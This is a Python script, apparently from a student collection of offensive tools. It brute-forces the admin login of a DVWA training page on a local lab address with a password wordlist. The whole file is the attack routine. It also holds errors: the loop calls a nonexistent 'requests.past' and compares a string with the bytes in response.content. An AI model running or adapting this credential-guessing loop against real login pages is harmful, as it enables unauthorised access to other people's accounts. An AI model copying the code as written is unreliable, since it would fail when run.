# coding=utf-8                                                                                           

"""                                                                                                      
    Security - Multiples offencives Tools                                                                
    Copyright (C) 2019 nbeny                                                                             
    <nbeny@student.42.fr>                                                                                
    This program is free software: you can redistribute it and/or modify                                 
    it under the terms of the GNU General Public License as published by                                 
    the Free Software Foundation, either version 3 of the License, or                                    
    (at your option) any later version.                                                                  
    This program is distributed in the hope that it will be useful,                                      
    but WITHOUT ANY WARRANTY; without even the implied warranty of                                       
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the                                        
    GNU General Public License for more details.                                                         
    You should have received a copy of the GNU General Public License                                    
    along with this program.  If not, see <https://www.gnu.org/licenses/>.                               
"""

#!/usr/bin/env python                                                                                    

import requests


target_url = "http://10.0.2.20/dvwa/login.php"
data_dict = {"username": "admin", "password": "", "Login": "submit"}
response = requests.post(target_url, data=data_dict)
print(response.content)


with open("/root/Downloads/passwords.list", "r") as wordlist_file:
    for line in wordlist_file:
        word = line.strip()
        data_dict["password"] = word
        response = requests.past(target_url, data=data_dict)
        if "Login failed" not in response.content:
            print("[+] Got the password --> " + word)
            exit()

print("[+] Reached end of line.")
